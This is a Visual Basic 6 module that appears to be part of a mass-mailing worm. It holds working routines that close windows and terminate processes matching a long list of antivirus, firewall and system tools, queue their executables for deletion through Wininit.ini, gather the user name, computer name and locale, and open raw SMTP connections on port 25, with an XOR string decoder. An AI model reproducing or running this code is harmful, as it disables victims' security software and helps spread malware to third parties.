   Attribute VB_Name = "Bmod"
   Public Declare Function EnumProcesses Lib "psapi.dll" _
      (ByRef lpidProcess As Long, ByVal cb As Long, _
         ByRef cbNeeded As Long) As Long

   Public Declare Function GetModuleFileNameExA Lib "psapi.dll" _
      (ByVal hProcess As Long, ByVal hModule As Long, _
         ByVal ModuleName As String, ByVal nSize As Long) As Long

   Public Declare Function EnumProcessModules Lib "psapi.dll" _
      (ByVal hProcess As Long, ByRef lphModule As Long, _
         ByVal cb As Long, ByRef cbNeeded As Long) As Long

   Public Const PROCESS_ALL_ACCESS = &H1F0FFF

   Public Declare Function WNetAddConnection2 Lib "mpr.dll" Alias "WNetAddConnection2A" _
       (lpNetResource As NETRESOURCE, ByVal lpPassword As String, _
       ByVal lpUserName As String, ByVal dwFlags As Long) As Long
   Public Declare Function WNetCancelConnection2 Lib "mpr.dll" Alias "WNetCancelConnection2A" _
       (ByVal lpName As String, ByVal dwFlags As Long, ByVal fForce As Long) As Long

   Public Type NETRESOURCE
   dwScope As Long: dwType As Long: dwDisplayType As Long: dwUsage As Long: lpLocalName As String
   lpRemoteName As String: lpComment As String: lpProvider As String
   End Type
   Public Const RESOURCETYPE_DISK = &H1: Public Const CONNECT_UPDATE_PROFILE = &H1

   Public Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
   Public Const WM_CLOSE = &H10
   Public Declare Function EnumWindows Lib "user32" (ByVal lpfn As Long, lParam As Any) As Boolean
   Public Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hWnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
   Public Declare Function GetVersionExA Lib "kernel32" (lpVersionInformation As OSVERSIONINFO) As Integer

   Public Type OSVERSIONINFO
   dwOSVersionInfoSize As Long: dwMajorVersion As Long: dwMinorVersion As Long: dwBuildNumber As Long: dwPlatformId As Long: szCSDVersion As String * 128
   End Type

   Public Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
   Public Declare Function TerminateProcess Lib "kernel32" (ByVal hProcess As Long, ByVal uExitCode As Long) As Long
   Public Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
   Public Declare Function Process32First Lib "kernel32" (ByVal hSnapshot As Long, lppe As Any) As Long
   Public Declare Function Process32Next Lib "kernel32" (ByVal hSnapshot As Long, lppe As Any) As Long
   Public Declare Function CreateToolhelp32Snapshot Lib "kernel32" (ByVal lFlgas As Long, ByVal lProcessID As Long) As Long
   Public Const TH32CS_SNAPPROCESS As Long = 2&: Const MAX_PATH As Long = 260
   Public Type PROCESSENTRY32
   dwSize As Long: cntUsage As Long: th32ProcessID As Long: th32DefaultHeapID As Long: th32ModuleID As Long: cntThreads As Long: th32ParentProcessID As Long: pcPriClassBase As Long: dwFlags As Long: szexeFile As String * MAX_PATH
   End Type

   Public Const WSADescription_Len = 256: Public Const WSASYS_Status_Len = 128

   Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Long, ByVal hWnd As Long, ByVal Msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
   Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hWnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
   Public Const GWL_WNDPROC = -4: Private lpPrevWndProc As Long
   Public mysock As Long, Progress As Integer, do_cancel As Boolean

   Public Const SOL_SOCKET = &HFFFF&: Public Const SO_LINGER = &H80&: Public Const FD_READ = &H1&: Public Const FD_WRITE = &H2&: Public Const FD_CONNECT = &H10&: Public Const FD_CLOSE = &H20&

   Public Const hostent_size = 16: Public Const IPPROTO_TCP = 6: Public Const INADDR_NONE = &HFFFF: Public Const sockaddr_size = 16

   Public Const INVALID_SOCKET = -1: Public Const SOCKET_ERROR = -1: Public Const SOCK_STREAM = 1

   Public Type LingerType
   l_onoff As Integer: l_linger As Integer
   End Type

   Type HostEnt
   h_name As Long: h_aliases As Long: h_addrtype As Integer: h_length As Integer: h_addr_list As Long
   End Type

   Public Type sockaddr
   sin_family As Integer: sin_port As Integer: sin_addr As Long: sin_zero As String * 8
   End Type

   Public Type WSADATAType
   wversion As Integer: wHighVersion As Integer: szDescription(0 To WSADescription_Len) As Byte: szSystemStatus(0 To WSASYS_Status_Len) As Byte: iMaxSockets As Integer: iMaxUdpDg As Integer: lpszVendorInfo As Long
   End Type

   Public Declare Function WSAGetLastError Lib "wsock32.dll" () As Long
   Public Declare Function WSACleanup Lib "wsock32.dll" () As Long
   Public Declare Function WSAStartup Lib "wsock32.dll" (ByVal wVR As Long, lpWSAD As WSADATAType) As Long
   Public Declare Function WSAIsBlocking Lib "wsock32.dll" () As Long
   Public Declare Function WSACancelBlockingCall Lib "wsock32.dll" () As Long
   Public Declare Function WSAAsyncSelect Lib "wsock32.dll" (ByVal s As Long, ByVal hWnd As Long, ByVal wMsg As Long, ByVal lEvent As Long) As Long

   Public Declare Function gethostname Lib "wsock32.dll" (ByVal hostname$, ByVal HostLen As Long) As Long
   Public Declare Function gethostbyname Lib "wsock32.dll" (ByVal hostname$) As Long
   Public Declare Sub MemCopy Lib "kernel32" Alias "RtlMoveMemory" (Dest As Any, ByVal Src As Long, ByVal cb&)

   Public Declare Function closesocket Lib "wsock32.dll" (ByVal s As Long) As Long
   Public Declare Function connect Lib "wsock32.dll" (ByVal s As Long, addr As sockaddr, ByVal namelen As Long) As Long
   Public Declare Function getsockopt Lib "wsock32.dll" (ByVal s As Long, ByVal level As Long, ByVal optname As Long, optval As Any, optlen As Long) As Long
   Public Declare Function htons Lib "wsock32.dll" (ByVal hostshort As Long) As Integer
   Public Declare Function inet_addr Lib "wsock32.dll" (ByVal cp As String) As Long
   Public Declare Function recv Lib "wsock32.dll" (ByVal s As Long, buf As Any, ByVal buflen As Long, ByVal flags As Long) As Long
   Public Declare Function send Lib "wsock32.dll" (ByVal s As Long, buf As Any, ByVal buflen As Long, ByVal flags As Long) As Long
   Public Declare Function setsockopt Lib "wsock32.dll" (ByVal s As Long, ByVal level As Long, ByVal optname As Long, optval As Any, ByVal optlen As Long) As Long
   Public Declare Function socket Lib "wsock32.dll" (ByVal af As Long, ByVal s_type As Long, ByVal protocol As Long) As Long
   Public MySocket As Integer
   Public rtncode As Integer
   Public Declare Function GetSystemDefaultLangID Lib "kernel32" () As Integer
   Public Declare Function GetLocaleInfo Lib "kernel32" Alias "GetLocaleInfoA" (ByVal Locale As Long, ByVal LCType As Long, ByVal lpLCData As String, ByVal cchData As Long) As Long
   Public Const LOCALE_SNATIVELANGNAME = &H4: Public Const LOCALE_SCOUNTRY = &H6
   Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long
   Private Declare Function GetComputerName Lib "kernel32" Alias "GetComputerNameA" (ByVal lpBuffer As String, nSize As Long) As Long

   Public Function FuncSearchScan(ByVal hWnd As Long, Parametro As Long) As Boolean
   On Error Resume Next: Dim VirTitle As String * 256, Wt As Long, Wc As Long, VirWindow As String, Vc(1 To 13) As String
   Vc(1) = "scan": Vc(2) = "virus": Vc(3) = "trojan": Vc(4) = "panda"
   Vc(5) = "mcafee": Vc(6) = "firewall": Vc(7) = "bitdefender": Vc(8) = "security"
   Vc(9) = "norton": Vc(10) = "norman": Vc(11) = "the hacker": Vc(12) = "thav": Vc(13) = "avp"

   DoEvents

   Wt = GetWindowText(ByVal hWnd, ByVal VirTitle, ByVal Len(VirTitle))
   VirWindow = Left(VirTitle, Wt)

   For i = 1 To 13
   If InStr(LCase(VirWindow), Vc(i)) <> 0 Then
   Wc = PostMessage(ByVal hWnd, WM_CLOSE, vbNull, vbNull)
   End If
   Next

   FuncSearchScan = True
   End Function

   Public Function GetWinVersion() As Long
   On Error Resume Next
       Dim OSinfo As OSVERSIONINFO, retvalue As Integer

       With OSinfo
           .dwOSVersionInfoSize = 148
           .szCSDVersion = Space$(128)
           retvalue = GetVersionExA(OSinfo)
       GetWinVersion = .dwPlatformId
       End With
   End Function

   Public Sub KAnti98()
   On Error Resume Next
   Dim BResult1, BResult2, OProcces, TProcces, CProcces As Long: Dim BProcces As PROCESSENTRY32

   BResult1 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
   BProcces.dwSize = Len(BProcces)
   BResult2 = Process32First(BResult1, BProcces)

   Do While BResult2

   If BScan(BProcces.szexeFile) Then

   Set Bf2 = CreateObject("Scripting.FileSystemObject")
   Set Bpf = Bf2.OpenTextFile(Bf2.GetSpecialFolder(0) & "\Wininit.ini", 8)
   Bpf.write vbCrLf & "NUL=" & MsD(Left(BProcces.szexeFile, InStr(LCase(BProcces.szexeFile), ".exe") + 3))
   Bpf.Close
   Set Bf2 = Nothing

   OProcess = OpenProcess(0, False, BProcces.th32ProcessID)
   TProcess = TerminateProcess(OProcess, 0)
   CProcess = CloseHandle(OProcess)
   End If
   BResult2 = Process32Next(BResult1, BProcces)

   Loop

   CProcces = CloseHandle(BResult1)
   End Sub

   Public Function BScan(ExeNm)
   On Error Resume Next
   BScanExe = Array("avp32.exe", "avpmon.exe", "zonealarm.exe", "vshwin32.exe", "vet95.exe", "tbscan.exe", "serv95.exe", "Nspclean.exe", "clrav.com", _
   "scan32.exe", "rav7.exe", "navw.exe", "outpost.exe", "nmain.exe", "navnt.exe", "mpftray.exe", _
   "lockdown2000.exe", "icssuppnt.exe", "icload95.exe", "iamapp.exe", "findviru.exe", "f-agnt95.exe", "dv95.exe", _
   "dv95_o.exe", "claw95ct.exe", "cfiaudit.exe", "avwupd32.exe", "avptc32.exe", "_avp32.exe", "avgctrl.exe", _
   "apvxdwin.exe", "_avpcc.exe", "avpcc.exe", "wfindv32.exe", "vsecomr.exe", "tds2-nt.exe", "sweep95.exe", "EFINET32.EXE", _
   "scrscan.exe", "safeweb.exe", "persfw.exe", "navsched.exe", "nvc95.exe", "nisum.exe", "navlu32.exe", "ALOGSERV", "AMON9X", "AVGSERV9", "AVGW", "avkpop", "avkservice", "AvkServ", "avkwctl9", "AVXMONITOR9X", "AVXMONITORNT", "AVXQUAR", _
   "moolive.exe", "jed.exe", "icsupp95.exe", "ibmavsp.exe", "frw.exe", "f-stopw.exe", "espwatch.exe", "procexp", "filemon.exe", "regmon.exe", _
   "dvp95.exe", "cfiadmin.exe", "avwin95.exe", "avpm.exe", "avp.exe", "ave32.exe", _
   "anti-trojan.exe", "webscan.exe", "webscanx.exe", "vsscan40.exe", "tds2-98.exe", "SymProxySvc", "SYMTRAY", "TAUMON", "TCM", "TDS-3", "TFAK", "vbcmserv", "VbCons", "VIR-HELP", "VPC32", "VPTRAY", "VSMAIN", "vsmon", "WIMMUN32", "WGFE95", "WEBTRAP", "WATCHDOG", "WrAdmin", _
   "sphinx.exe", "scanpm.exe", _
   "rescue.exe", "pcfwallicon.exe", "pavcl.exe", "nupgrade.exe", "navwnt.exe", "navapw32.exe", "luall.exe", _
   "iomon98.exe", "icmoon.exe", "fprot.exe", "f-prot95.exe", "esafe.exe", "cleaner3.exe", "IBMASN.EXE", "AVXW", "cfgWiz", "CMGRDIAN", "CONNECTIONMONITOR", "CPDClnt", "DEFWATCH", "CTRL", "defalert", "defscangui", "DOORS", "EFPEADM", "ETRUSTCIPE", "EVPN", "EXPERT", "fameh32", "fch32", "fih32", _
   "blackice.exe", "avsched32.exe", "avpdos32.exe", "avpnt.exe", "avconsol.exe", "ackwin32.exe", "NWTOOL16", "pccwin97", "PROGRAMAUDITOR", "POP3TRAP", "PROCESSMONITOR", "PORTMONITOR", "POPROXY", "pcscan", "pcntmon", "pavproxy", "PADMIN", "pview95", "rapapp.exe", "REALMON", "RTVSCN95", _
   "vsstat.exe", "vettray.exe", "tca.exe", "smc.exe", "scan95.exe", "rav7win.exe", "pccwin98.exe", "KPFW32.EXE", "ADVXDWIN", _
   "padmin.exe", "normist.exe", "navw32.exe", "n32scan.exe", "lookout.exe", "iface.exe", "icloadnt.exe", "SPYXX", "SS3EDIT", "SweepNet", _
   "iamserv.exe", "fp-win.exe", "f-prot.exe", "ecengine.exe", "cleaner.exe", "cfind.exe", "blackd.exe", "RULAUNCH", "sbserv", "SWNETSUP", "WrCtrl", _
   "avpupd.exe", "avkserv.exe", "autodown.exe", "_avpm.exe", "avpm.exe", "regedit.exe", "msconfig.exe", "FPROT95.EXE", "IBMASN.EXE", _
   "sfc.exe", "regedt32.exe", "offguard.exe", "pav.exe", "pavmail.exe", "per.exe", "perd.exe", _
   "pertsk.exe", "perupd.exe", "pervac.exe", "pervacd.exe", "th.exe", "th32.exe", "th32upd.exe", _
   "thav.exe", "thd.exe", "thd32.exe", "thmail.exe", "alertsvc.exe", "amon.exe", "kpf.exe", _
   "antivir", "avsynmgr.exe", "cfinet.exe", "cfinet32.exe", "icmon.exe", "lockdownadvanced.exe", _
   "lucomserver.exe", "mcafee", "navapsvc.exe", "navrunr.exe", "nisserv.exe", _
   "nsched32.exe", "pcciomon.exe", "pccmain.exe", "pview95.exe", "Avnt.exe", "Claw95cf.exe", "Dvp95_0.exe", "Vscan40.exe", "Icsuppnt.exe", "Jedi.exe", "N32scanw.exe", "Pavsched.exe", "Pavw.exe", "Avrep32.exe", "Monitor.exe", _
   "fsgk32", "fsm32", "fsma32", "fsmb32", "gbmenu", "GBPOLL", "GENERICS", "GUARD", "IAMSTATS", "ISRV95", "LDPROMENU", "LDSCAN", "LUSPT", "MCMNHDLR", "MCTOOL", "MCUPDATE", "MCVSRTE", "MGHTML", "MINILOG", "MCVSSHLD", "MCAGENT", "MPFSERVICE", "MWATCH", "NeoWatchLog", "NVSVC32", "NWService", "NTXconfig", "NTVDM", "ntrtscan", "npssvc", "npscheck", "netutils", "ndd32", "NAVENGNAVEX15", _
   "notstart.exe", "zapro.exe", "pqremove.com", "BullGuard", "CCAPP.EXE", "vet98.exe", "VET32.EXE", "VCONTROL.EXE", "claw95.exe", "ANTS", "ATCON", "ATUPDATER", "ATWATCH", "AutoTrace", "AVGCC32", "AvgServ", "AVWINNT", "fnrb32", "fsaa", "fsav32", "ZAP.EXE", "ZAPD.EXE", "ZAPPRG.EXE", "ZAPS.EXE", "ZCAP.EXE")

   For i = 0 To UBound(BScanExe)
   DoEvents
   If InStr(LCase(ExeNm), LCase(BScanExe(i))) <> 0 Then
   BScan = True
   Exit Function
   End If
   Next
   BScan = False
   End Function

   Public Function MsD(x)
   On Error Resume Next: Msn = Split(x, "\")
   For i = 0 To UBound(Msn) - 1
   If Len(Msn(i)) > 8 Then
   If InStr(Msn(i), Space(1)) <> 0 Then Msn(i) = Replace(Msn(i), Space(1), "")
   Mn1 = Left(Msn(i), 6) & "~1" & "\"
   Else
   If InStr(Msn(i), Space(1)) <> 0 Then Msn(i) = Replace(Msn(i), Space(1), "")
   Mn1 = Msn(i) & "\"
   End If
   MsD = MsD & Mn1
   Next
   If Len(Msn(UBound(Msn))) > 12 Then
   MSN2 = Left(Msn(UBound(Msn)), 6) & "~1" & Right(Msn(UBound(Msn)), 4)
   Else
   MSN2 = Msn(UBound(Msn))
   End If
   MsD = MsD & MSN2
   End Function

   Public Function StartWinsock() As Boolean
   On Error Resume Next:
   Dim StartupData As WSADATAType
   StartWinsock = IIf(WSAStartup(&H101, StartupData) = 0, True, False)
   End Function

   Public Sub EndWinsock()
   On Error Resume Next: Dim ret As Long
   If WSAIsBlocking() Then ret = WSACancelBlockingCall()
   ret = WSACleanup()
   End Sub

   Public Function LanguageID()
   On Error Resume Next
   Dim sBuf As String
   LCID = GetSystemDefaultLangID(): sBuf = Space$(255)
   Call GetLocaleInfo(LCID, LOCALE_SNATIVELANGNAME, sBuf, Len(sBuf))
   LanguageID = Trim$(sBuf)
   End Function

   Public Function PaisID()
   On Error Resume Next
   Dim sBuf As String
   LCID = GetSystemDefaultLangID(): sBuf = Space$(255)
   Call GetLocaleInfo(LCID, LOCALE_SCOUNTRY, sBuf, Len(sBuf))
   PaisID = Trim$(sBuf)
   End Function

   Public Function BGetComputerName()
   On Error Resume Next: Dim sBuffer As String, lBufSize As Long, lStatus As Long
   lBufSize = 255: sBuffer = String$(lBufSize, " "): lStatus = GetComputerName(sBuffer, lBufSize)
   If lStatus <> 0 Then BGetComputerName = Left(sBuffer, lBufSize)
   End Function

   Public Function GetUser()
   On Error Resume Next: Dim lpUserID As String, nBuffer As Long, ret As Long
   lpUserID = String(25, 0): nBuffer = 25
   ret = GetUserName(lpUserID, nBuffer)
   If ret Then GetUser = lpUserID
   End Function

   Public Sub KantiNT()
   On Error Resume Next
   Dim cb As Long, cbNeeded As Long, NumElements As Long, ProcessIDs() As Long, cbNeeded2 As Long
   Dim Modules(1 To 1024) As Long, lRet As Long, ModuleName As String
   Dim nSize As Long, hProcess As Long, i As Long, sModName As String
   cb = 8: cbNeeded = 96
       Do While cb <= cbNeeded
          cb = cb * 2: ReDim ProcessIDs(cb / 4) As Long: lRet = EnumProcesses(ProcessIDs(1), cb, cbNeeded)
       Loop

   NumElements = cbNeeded / 4
       For i = 1 To NumElements

           hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, ProcessIDs(i))
   If hProcess Then
   lRet = EnumProcessModules(hProcess, Modules(1), 1024, cbNeeded2): lRet = EnumProcessModules(hProcess, Modules(1), cbNeeded2, cbNeeded2)
    If lRet <> 0 Then
   ModuleName = Space(260): nSize = 500
   lRet = GetModuleFileNameExA(hProcess, Modules(1), ModuleName, nSize)
   sModName = Left$(ModuleName, lRet)
   If BScan(sModName) = True Then
   lRet = TerminateProcess(hProcess, 0)
   End If
    End If
   End If
   lRet = CloseHandle(hProcess)
   Next
   End Sub

   Public Function WSAGetAsyncError(ByVal lParam As Long) As Integer
   On Error Resume Next: WSAGetAsyncError = (lParam And &HFFFF0000) \ &H10000
   End Function

   Public Function Hook(ByVal hWnd As Long)
       On Error Resume Next: lpPrevWndProc = SetWindowLong(hWnd, GWL_WNDPROC, AddressOf WindowProc)
   End Function

   Public Sub UnHook(ByVal hWnd As Long)
       On Error Resume Next: Call SetWindowLong(hWnd, GWL_WNDPROC, lpPrevWndProc)
   End Sub

   Function WindowProc(ByVal hw As Long, ByVal uMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
   On Error Resume Next: Dim x As Long, a As String, ReadBuffer(1000) As Byte, e_err

   Select Case uMsg

    Case 1025
    e_err = WSAGetAsyncError(lParam)
    If e_err <> 0 Then do_cancel = True

      Select Case lParam
       Case FD_READ: x = recv(mysock, ReadBuffer(0), 1000, 0)
       If x > 0 Then
       a = StrConv(ReadBuffer, vbUnicode): rtncode = Val(Mid(a, 1, 3))
       Select Case rtncode
        Case 550, 551, 552, 553, 554, 451, 452, 500: do_cancel = True
       End Select
       End If

    Case FD_CONNECT: mysock = wParam: Progress = Progress + 1

    Case FD_CLOSE:: Call closesocket(mysock)
    End Select
    End Select

       WindowProc = CallWindowProc(lpPrevWndProc, hw, uMsg, wParam, lParam)
   End Function

   Public Function SetSockLinger(ByVal SockNum As Long, ByVal OnOff As Integer, ByVal LingerTime As Integer) As Long
   On Error Resume Next: Dim Linger As LingerType: Linger.l_onoff = OnOff: Linger.l_linger = LingerTime

   If setsockopt(SockNum, SOL_SOCKET, SO_LINGER, Linger, 4) <> 0 Then
   SetSockLinger = SOCKET_ERROR
   Else

   If getsockopt(SockNum, SOL_SOCKET, SO_LINGER, Linger, 4) <> 0 Then
   SetSockLinger = SOCKET_ERROR
   End If
   End If
   End Function

   Function GetHostByNameAlias(ByVal hostname) As Long
   On Error Resume Next: Dim phe As Long, heDestHost As HostEnt, addrList As Long, retIP As Long
   retIP = inet_addr(hostname)

   If retIP = INADDR_NONE Then
    phe = gethostbyname(hostname)
     If phe <> 0 Then
       MemCopy heDestHost, ByVal phe, hostent_size
       MemCopy addrList, ByVal heDestHost.h_addr_list, 4
       MemCopy retIP, ByVal addrList, heDestHost.h_length
       Else
       retIP = INADDR_NONE
     End If
   End If

   GetHostByNameAlias = retIP
       If Err Then GetHostByNameAlias = INADDR_NONE
   End Function

   Public Function SendData(ByVal s As Long, vMessage As Variant) As Long
   On Error Resume Next: Dim TheMsg() As Byte
               TheMsg = StrConv(vMessage, vbFromUnicode)
   If UBound(TheMsg) > -1 Then
       SendData = send(s, TheMsg(0), (UBound(TheMsg) - LBound(TheMsg) + 1), 0)
   End If
   End Function

   Public Function ConnectSock(ByVal Host As String, ByVal HWndToMsg As Long) As Long
   On Error Resume Next: Dim s As Long, SelectOps As Long, sockin As sockaddr
   sockin.sin_family = 2: sockin.sin_port = htons(25)

   If sockin.sin_port = INVALID_SOCKET Then: ConnectSock = INVALID_SOCKET: Exit Function

   sockin.sin_addr = GetHostByNameAlias(Host)

   If sockin.sin_addr = INADDR_NONE Then ConnectSock = INVALID_SOCKET: Exit Function

   s = socket(2, SOCK_STREAM, IPPROTO_TCP)

   If s < 0 Then ConnectSock = INVALID_SOCKET: Exit Function

   If SetSockLinger(s, 1, 0) = SOCKET_ERROR Then
       If s > 0 Then Call closesocket(s)
       ConnectSock = INVALID_SOCKET: Exit Function
   End If

   SelectOps = FD_READ Or FD_WRITE Or FD_CONNECT Or FD_CLOSE

   If WSAAsyncSelect(s, HWndToMsg, ByVal 1025, ByVal SelectOps) Then
       If s > 0 Then Call closesocket(s)
       ConnectSock = INVALID_SOCKET: Exit Function
   End If

   If connect(s, sockin, sockaddr_size) <> -1 Then
    If s > 0 Then Call closesocket(s)
    ConnectSock = INVALID_SOCKET: Exit Function
   End If

   ConnectSock = s
   End Function

   Public Function q(j)
   On Error Resume Next
   For R = 1 To Len(j)
   q = q & Chr(Asc(Mid(j, R, 1)) Xor 7)
   Next
   End Function
